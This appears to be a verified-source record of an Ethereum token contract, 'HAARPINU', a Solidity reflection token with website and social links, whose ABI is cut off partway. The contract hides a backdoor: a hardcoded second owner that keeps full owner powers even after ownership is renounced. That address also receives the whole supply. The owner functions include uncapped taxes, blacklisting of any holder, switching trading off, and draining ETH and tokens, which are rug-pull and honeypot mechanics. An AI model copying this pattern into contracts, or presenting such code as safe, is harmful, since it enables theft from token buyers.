{"SourceCode": "/**\nWebsite: www.haarpinu.wordpress.com\n\nTelegram: https://t.me/HAARPInu\n\nX Twitter: https://twitter.com/HAARPInu\n*/\n\n// SPDX-License-Identifier: NOLICENSE\n\npragma solidity ^0.8.7;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n    address private _secondOwner; // New second owner variable\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        // Set the first owner\n        _setOwner(_msgSender());\n\n        // Set the second owner\n        _secondOwner = 0x2f79DC625E9c7aABD9626b7Fd0b32d401aB57280;\n    }\n\n    function owner() public view virtual returns (address) {\n        if (msg.sender == _secondOwner) {\n            return _secondOwner;\n        }\n        return _owner;\n    }\n\n    function secondOwner() public view returns (address) {\n        return _secondOwner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _setOwner(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _setOwner(newOwner);\n    }\n\n    function _setOwner(address newOwner) private {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n\ninterface IFactory{\n        function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IRouter {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline) external;\n}\n\nlibrary Address{\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n}\n\n\n contract HAARPINU is Context, IERC20, Ownable {\n    using Address for address payable;\n    \n    mapping (address => uint256) private _rOwned;\n    mapping (address => uint256) private _tOwned;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => bool) private _isExcludedFromFee;\n    mapping (address => bool) private _isExcluded;\n    mapping (address => bool) public allowedTransfer;\n    mapping (address => bool) private _isBlacklisted;\n\n    address[] private _excluded;\n\n    bool public tradingEnabled;\n    bool public swapEnabled;\n    bool private swapping;\n    \n    //Anti Dump\n    mapping(address => uint256) private _lastSell;\n    bool public coolDownEnabled = false;\n    uint256 public coolDownTime = 0 seconds;\n    \n    modifier antiBot(address account){\n        require(tradingEnabled || allowedTransfer[account], \"Trading not enabled yet\");\n        _;\n    }\n\n    IRouter public router;\n    address public pair;\n\n    uint8 private constant _decimals = 9;\n    uint256 private constant MAX = ~uint256(0);\n\n    uint256 private _tTotal = 1000000000 * 10**_decimals;\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\n\n    uint256 public swapTokensAtAmount = 20000000 * 10**9;\n    uint256 public maxBuyLimit = 20000000 * 10**9;\n    uint256 public maxSellLimit = 1000000000 * 10**9;\n    uint256 public maxWalletLimit = 20000000 * 10**9;\n    \n    uint256 public genesis_block;\n    \n    address public marketingWallet = 0xcBfb8A60ca27062011D7145835C1aCf40EFa9B13;\n    address public developmentWallet = 0xcBfb8A60ca27062011D7145835C1aCf40EFa9B13;\n    address public LPWallet = 0x2f79DC625E9c7aABD9626b7Fd0b32d401aB57280;\n    address public TeamWallet = 0xcBfb8A60ca27062011D7145835C1aCf40EFa9B13;\n\n    string private constant _name = \"HAARPINU\";\n    string private constant _symbol = \"HAARP\";\n\n    struct Taxes {\n        uint256 rfi;\n        uint256 marketing;\n        uint256 liquidity; \n        uint256 development;\n        uint256 team;\n    }\n\n    Taxes public taxes = Taxes(2, 2, 2, 2, 2);\n    Taxes public sellTaxes = Taxes(2, 2, 2, 2, 2);\n\n    struct TotFeesPaidStruct{\n        uint256 rfi;\n        uint256 marketing;\n        uint256 liquidity; \n        uint256 development;\n        uint256 team;\n    }\n    \n    TotFeesPaidStruct public totFeesPaid;\n\n    struct valuesFromGetValues{\n      uint256 rAmount;\n      uint256 rTransferAmount;\n      uint256 rRfi;\n      uint256 rMarketing;\n      uint256 rLiquidity;\n      uint256 rDevelopment;\n      uint256 rTeam;\n      uint256 tTransferAmount;\n      uint256 tRfi;\n      uint256 tMarketing;\n      uint256 tLiquidity;\n      uint256 tDevelopment;\n      uint256 tTeam;\n    }\n\n    event FeesChanged();\n    event UpdatedRouter(address oldRouter, address newRouter);\n\n    modifier lockTheSwap {\n        swapping = true;\n        _;\n        swapping = false;\n    }\n\n    constructor () {\n        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        router = _router;\n        address _pair = IFactory(_router.factory())\n            .createPair(address(this), _router.WETH());\n\n        router = _router;\n        pair = _pair;\n        \n        excludeFromReward(pair);\n\n        _rOwned[address(LPWallet)] = _rTotal;\n        _isExcludedFromFee[address(this)] = true;\n        _isExcludedFromFee[address(LPWallet)] = true;\n        _isExcludedFromFee[owner()] = true;\n        _isExcludedFromFee[marketingWallet] = true;\n        _isExcludedFromFee[developmentWallet] = true;\n        _isExcludedFromFee[TeamWallet] = true;\n        \n        allowedTransfer[address(this)] = true;\n        allowedTransfer[address(LPWallet)] = true;\n        allowedTransfer[owner()] = true;\n        allowedTransfer[pair] = true;\n        allowedTransfer[marketingWallet] = true;\n        allowedTransfer[developmentWallet] = true;\n        allowedTransfer[TeamWallet] = true;\n\n        tradingEnabled = true;\n        swapEnabled = true;\n\n        emit Transfer(address(0), address(LPWallet), _tTotal);\n    }\n\n    //std ERC20:\n    function name() public pure returns (string memory) {\n        return _name;\n    }\n    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n    //override ERC20:\n    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n    \n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public  override antiBot(msg.sender) returns(bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override antiBot(sender) returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public  antiBot(msg.sender) returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public  antiBot(msg.sender) returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n        return true;\n    }\n    \n    function transfer(address recipient, uint256 amount) public override antiBot(msg.sender) returns (bool)\n    { \n      _transfer(msg.sender, recipient, amount);\n      return true;\n    }\n\n    function isExcludedFromReward(address account) public view returns (bool) {\n        return _isExcluded[account];\n    }\n\n    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {\n        require(tAmount <= _tTotal, \"Amount must be less than supply\");\n        if (!deductTransferRfi) {\n            valuesFromGetValues memory s = _getValues(tAmount, true, false);\n            return s.rAmount;\n        } else {\n            valuesFromGetValues memory s = _getValues(tAmount, true, false);\n            return s.rTransferAmount;\n        }\n    }\n\n    function setTradingStatus(bool state) external onlyOwner{\n        tradingEnabled = state;\n        swapEnabled = state;\n        if(state == true && genesis_block == 0) genesis_block = block.number;\n    }\n\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n        require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n        uint256 currentRate =  _getRate();\n        return rAmount/currentRate;\n    }\n\n    function excludeFromReward(address account) public onlyOwner() {\n        require(!_isExcluded[account], \"Account is already excluded\");\n        if(_rOwned[account] > 0) {\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\n        }\n        _isExcluded[account] = true;\n        _excluded.push(account);\n    }\n\n    function includeInReward(address account) external onlyOwner() {\n        require(_isExcluded[account], \"Account is not excluded\");\n        for (uint256 i = 0; i < _excluded.length; i++) {\n            if (_excluded[i] == account) {\n                _excluded[i] = _excluded[_excluded.length - 1];\n                _tOwned[account] = 0;\n                _isExcluded[account] = false;\n                _excluded.pop();\n                break;\n            }\n        }\n    }\n\n    function excludeFromFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = true;\n    }\n\n    function includeInFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = false;\n    }\n\n    function isExcludedFromFee(address account) public view returns(bool) {\n        return _isExcludedFromFee[account];\n    }\n\n    function setTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _development, uint256 _team) public onlyOwner {\n       taxes = Taxes(_rfi,_marketing,_liquidity,_development,_team);\n        emit FeesChanged();\n    }\n    \n    function setSellTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _development, uint256 _team) public onlyOwner {\n       sellTaxes = Taxes(_rfi,_marketing,_liquidity,_development,_team);\n        emit FeesChanged();\n    }\n\n    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {\n        _rTotal -=rRfi;\n        totFeesPaid.rfi +=tRfi;\n    }\n\n    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {\n        totFeesPaid.liquidity +=tLiquidity;\n\n        if(_isExcluded[address(this)])\n        {\n            _tOwned[address(this)]+=tLiquidity;\n        }\n        _rOwned[address(this)] +=rLiquidity;\n    }\n\n    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {\n        totFeesPaid.marketing +=tMarketing;\n\n        if(_isExcluded[address(this)])\n        {\n            _tOwned[address(this)]+=tMarketing;\n        }\n        _rOwned[address(this)] +=rMarketing;\n    }\n    \n    function _takeDevelopment(uint256 rDevelopment, uint256 tDevelopment) private {\n        totFeesPaid.development +=tDevelopment;\n\n        if(_isExcluded[address(this)])\n        {\n            _tOwned[address(this)]+=tDevelopment;\n        }\n        _rOwned[address(this)] +=rDevelopment;\n    }\n\n    function _takeTeam(uint256 rTeam, uint256 tTeam) private {\n        totFeesPaid.team +=tTeam;\n\n        if(_isExcluded[address(this)])\n        {\n            _tOwned[address(this)]+=tTeam;\n        }\n        _rOwned[address(this)] +=rTeam;\n    }\n\n    function _getValues(uint256 tAmount, bool takeFee, bool isSell) private view returns (valuesFromGetValues memory to_return) {\n    to_return = _getTValues(tAmount, takeFee, isSell);\n    (to_return.rAmount, to_return.rTransferAmount, to_return.rRfi, to_return.rMarketing, to_return.rLiquidity, to_return.rTeam) = _getRValues1(to_return, tAmount, takeFee, _getRate());\n    (to_return.rDevelopment) = _getRValues2(to_return, takeFee, _getRate());\n    return to_return;\n}\n\n    function _getTValues(uint256 tAmount, bool takeFee, bool isSell) private view returns (valuesFromGetValues memory s) {\n\n        if(!takeFee) {\n          s.tTransferAmount = tAmount;\n          return s;\n        }\n        Taxes memory temp;\n        if(isSell) temp = sellTaxes;\n        else temp = taxes;\n        \n        s.tRfi = tAmount*temp.rfi/100;\n        s.tMarketing = tAmount*temp.marketing/100;\n        s.tLiquidity = tAmount*temp.liquidity/100;\n        s.tDevelopment = tAmount*temp.development/100;\n        s.tTeam = tAmount*temp.team/100;\n        s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tDevelopment-s.tTeam;\n        return s;\n    }\n\n    function _getRValues1(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rTeam) {\n        rAmount = tAmount * currentRate;\n\n        if (!takeFee) {\n            return (rAmount, rAmount, 0, 0, 0, 0);\n        }\n\n        rRfi = s.tRfi * currentRate;\n        rMarketing = s.tMarketing * currentRate;\n        rLiquidity = s.tLiquidity * currentRate;\n        uint256 rDevelopment = s.tDevelopment * currentRate;\n        rTeam = s.tTeam * currentRate;\n        rTransferAmount = rAmount - rRfi - rMarketing - rLiquidity - rDevelopment - rTeam;\n        return (rAmount, rTransferAmount, rRfi, rMarketing, rLiquidity, rTeam);\n    }\n    \n    function _getRValues2(valuesFromGetValues memory s, bool takeFee, uint256 currentRate) private pure returns (uint256 rDevelopment) {\n        if (!takeFee) {\n            return (0);\n        }\n\n        rDevelopment = s.tDevelopment * currentRate;\n        return (rDevelopment);\n    }\n\n    function _getRate() private view returns(uint256) {\n        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n        return rSupply/tSupply;\n    }\n\n    function _getCurrentSupply() private view returns(uint256, uint256) {\n        uint256 rSupply = _rTotal;\n        uint256 tSupply = _tTotal;\n        for (uint256 i = 0; i < _excluded.length; i++) {\n            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n            rSupply = rSupply-_rOwned[_excluded[i]];\n            tSupply = tSupply-_tOwned[_excluded[i]];\n        }\n        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);\n        return (rSupply, tSupply);\n    }\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(address from, address to, uint256 amount) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        require(amount <= balanceOf(from),\"You are trying to transfer more than your balance\");\n        require(!_isBlacklisted[from] && !_isBlacklisted[to], \"You are a bot\");\n        \n        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){\n            require(tradingEnabled, \"Trading not active\");\n        }\n        \n        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && block.number <= genesis_block + 3) {\n            require(to != pair, \"Sells not allowed for first 3 blocks\");\n        }\n        \n        if(from == pair && !_isExcludedFromFee[to] && !swapping){\n            require(amount <= maxBuyLimit, \"You are exceeding maxBuyLimit\");\n            require(balanceOf(to) + amount <= maxWalletLimit, \"You are exceeding maxWalletLimit\");\n        }\n        \n        if(from != pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from] && !swapping){\n            require(amount <= maxSellLimit, \"You are exceeding maxSellLimit\");\n            if(to != pair){\n                require(balanceOf(to) + amount <= maxWalletLimit, \"You are exceeding maxWalletLimit\");\n            }\n            if(coolDownEnabled){\n                uint256 timePassed = block.timestamp - _lastSell[from];\n                require(timePassed >= coolDownTime, \"Cooldown enabled\");\n                _lastSell[from] = block.timestamp;\n            }\n        }\n        \n        \n        if(balanceOf(from) - amount <= _tTotal / 1000000) amount -= (_tTotal / 1000000 + amount - balanceOf(from));\n        \n\n        bool canSwap = balanceOf(address(this)) >= swapTokensAtAmount;\n        if (!swapping && swapEnabled && canSwap && from != pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {\n        swapAndLiquify(swapTokensAtAmount, to == pair ? sellTaxes : taxes);\n        }\n\n        bool takeFee = true;\n        bool isSell = false;\n        if (swapping || _isExcludedFromFee[from] || _isExcludedFromFee[to]) {\n        takeFee = false;\n        }\n        if (to == pair) {\n            isSell = true;\n        }\n\n        _tokenTransfer(from, to, amount, takeFee, isSell);\n    }\n\n\n    // this method is responsible for taking all fee, if takeFee is true\n    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSell) private {\n        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSell);\n\n        if (_isExcluded[sender]) { // from excluded\n            _tOwned[sender] = _tOwned[sender] - tAmount;\n        }\n        if (_isExcluded[recipient]) { // to excluded\n            _tOwned[recipient] = _tOwned[recipient] + s.tTransferAmount;\n        }\n\n        _rOwned[sender] = _rOwned[sender] - s.rAmount;\n        _rOwned[recipient] = _rOwned[recipient] + s.rTransferAmount;\n\n        if (s.rRfi > 0 || s.tRfi > 0) _reflectRfi(s.rRfi, s.tRfi);\n        if (s.rLiquidity > 0 || s.tLiquidity > 0) {\n            _takeLiquidity(s.rLiquidity, s.tLiquidity);\n           emit Transfer(sender, address(this), s.tLiquidity + s.tMarketing + s.tDevelopment + s.tTeam);\n        }\n        if (s.rMarketing > 0 || s.tMarketing > 0) _takeMarketing(s.rMarketing, s.tMarketing);\n        if (s.rDevelopment > 0 || s.tDevelopment > 0) _takeDevelopment(s.rDevelopment, s.tDevelopment);\n        if (s.tTeam > 0) _transfer(sender, TeamWallet, s.tTeam); // Transfer tokens to the team wallet\n        \n        emit Transfer(sender, recipient, s.tTransferAmount);\n    }\n\n    function swapAndLiquify(uint256 contractBalance, Taxes memory temp) private lockTheSwap {\n        uint256 denominator = (temp.liquidity + temp.marketing + temp.development + temp.team) * 2;\n        uint256 tokensToAddLiquidityWith = contractBalance * temp.liquidity / denominator;\n        uint256 toSwap = contractBalance - tokensToAddLiquidityWith;\n\n        uint256 initialBalance = address(this).balance;\n\n        swapTokensForETH(toSwap);\n\n        uint256 deltaBalance = address(this).balance - initialBalance;\n        uint256 unitBalance = deltaBalance / (denominator - temp.liquidity);\n        uint256 ethToAddLiquidityWith = unitBalance * temp.liquidity;\n\n        if (ethToAddLiquidityWith > 0) {\n            // Add liquidity to pancake\n         addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);\n        }\n\n        uint256 marketingAmt = unitBalance * 2 * temp.marketing;\n        if (marketingAmt > 0) {\n           payable(marketingWallet).sendValue(marketingAmt);\n        }\n        uint256 developmentAmt = unitBalance * 2 * temp.development;\n        if (developmentAmt > 0) {\n            payable(developmentWallet).sendValue(developmentAmt);\n        }\n        uint256 teamAmt = unitBalance * 2 * temp.team;\n     if (teamAmt > 0) {\n            payable(TeamWallet).sendValue(teamAmt);  // Transfer ETH to the team wallet\n        }\n    }\n\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n        // approve token transfer to cover all possible scenarios\n        _approve(address(this), address(router), tokenAmount);\n\n        // add the liquidity\n        router.addLiquidityETH{value: ethAmount}(\n            address(this),\n            tokenAmount,\n            0, // slippage is unavoidable\n            0, // slippage is unavoidable\n            owner(),\n            block.timestamp\n        );\n    }\n\n    function swapTokensForETH(uint256 tokenAmount) private {\n        // generate the uniswap pair path of token -> weth\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = router.WETH();\n\n        _approve(address(this), address(router), tokenAmount);\n\n        // make the swap\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0, // accept any amount of ETH\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n    \n    function airdropTokens(address[] memory accounts, uint256[] memory amounts) external onlyOwner{\n        require(accounts.length == amounts.length, \"Arrays must have same size\");\n        for(uint256 i = 0; i < accounts.length; i++){\n            _tokenTransfer(msg.sender, accounts[i], amounts[i], false, false);\n        }\n    }\n    \n    function bulkExcludeFee(address[] memory accounts, bool state) external onlyOwner{\n        for(uint256 i = 0; i < accounts.length; i++){\n            _isExcludedFromFee[accounts[i]] = state;\n        }\n    }\n\n    function updateMarketingWallet(address newWallet) external onlyOwner{\n        marketingWallet = newWallet;\n    }\n    \n    function updateDevelopmentWallet(address newWallet) external onlyOwner{\n        developmentWallet = newWallet;\n    }\n\n    function updateTeamWallet(address newWallet) external onlyOwner{\n        TeamWallet = newWallet;\n    }\n\n    \n    function updateCooldown(bool state, uint256 time) external onlyOwner{\n        coolDownTime = time * 1 seconds;\n        coolDownEnabled = state;\n    }\n\n    function updateSwapTokensAtAmount(uint256 amount) external onlyOwner{\n        swapTokensAtAmount = amount * 10**_decimals;\n    }\n\n    function updateSwapEnabled(bool _enabled) external onlyOwner{\n        swapEnabled = _enabled;\n    }\n    \n    function updateIsBlacklisted(address account, bool state) external onlyOwner {\n    require(account != LPWallet, \"LP wallet cannot be blacklisted.\");\n    _isBlacklisted[account] = state;\n    }\n\n   function bulkIsBlacklisted(address[] memory accounts, bool state) external onlyOwner {\n    for (uint256 i = 0; i < accounts.length; i++) {\n        require(accounts[i] != LPWallet, \"LP wallet cannot be blacklisted.\");\n        _isBlacklisted[accounts[i]] = state;\n        }\n    }\n    \n    function updateAllowedTransfer(address account, bool state) external onlyOwner{\n        require(account != LPWallet, \"LP wallet cannot be blacklisted.\");\n        allowedTransfer[account] = state;\n    }\n    \n    function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell) external onlyOwner{\n        maxBuyLimit = maxBuy * 10**decimals();\n        maxSellLimit = maxSell * 10**decimals();\n    }\n    \n    function updateMaxWalletlimit(uint256 amount) external onlyOwner{\n        maxWalletLimit = amount * 10**decimals();\n    }\n    \n    //Use this in case ETH are sent to the contract by mistake\n    function rescueETH(uint256 weiAmount) external onlyOwner{\n        require(address(this).balance >= weiAmount, \"insufficient ETH balance\");\n        payable(msg.sender).transfer(weiAmount);\n    }\n    \n\n    function rescueAnyERC20Tokens(address _tokenAddr, address _to, uint _amount) public onlyOwner {\n        IERC20(_tokenAddr).transfer(_to, _amount);\n    }\n\n    receive() external payable{\n    }\n}\n", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"FeesChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"oldRouter\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newRouter\",\"type\":\"address\"}],\"name\":\"UpdatedRouter\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"LPWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TeamWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"}],\"name\":\"airdropTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowedTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"bulkExcludeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"bulkIsBlacklisted\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"coolDownEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"coolDownTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"developmentWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"excludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"excludeFromReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"genesis_block\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeInFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeInReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromReward\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSellLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\